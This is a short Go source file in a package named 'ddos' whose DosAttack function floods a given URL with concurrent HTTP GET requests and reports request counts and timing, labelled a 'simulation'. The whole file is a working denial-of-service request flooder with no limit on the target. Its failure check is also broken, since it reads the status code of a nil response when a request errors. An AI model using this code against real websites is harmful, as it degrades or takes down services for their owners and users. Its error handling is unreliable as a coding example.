package ddos

import (
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"
)

var (
	failedReq = 0
	totalReq  = 0
	totalTime time.Duration
	mu        sync.Mutex
)

func SendReq(wg *sync.WaitGroup, url string) {
	defer wg.Done()
	start := time.Now()
	resp, err := http.Get(url)
	elapsed := time.Since(start)

	mu.Lock()
	totalReq++
	totalTime += elapsed

	if err != nil && resp.StatusCode != 200 {
		failedReq++
		fmt.Println("Error: DoS_script.go: ", err)
	}
	mu.Unlock()
}

func DosAttack(url string, numRequests, concurrency int) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, concurrency)

	for i := 0; i < numRequests; i++ {
		wg.Add(1)
		semaphore <- struct{}{} // add an empty struct into the semaphore channel or block it if it is full already so wait till it empties

		go func() {
			defer func() { <-semaphore }() // free up a slot on the semaphore channel
			SendReq(&wg, url)
		}()
	}

	wg.Wait() // wait for all request to complete
	// slog.Log("DoS attack simulation completed.")
	log.Println("DoS attack simulation completed.")
	fmt.Printf("Total requests: %d\n", totalReq)
	fmt.Printf("Failed requests: %d\n", failedReq)
	fmt.Printf("Average response time: %v\n", totalTime/time.Duration(totalReq))

}
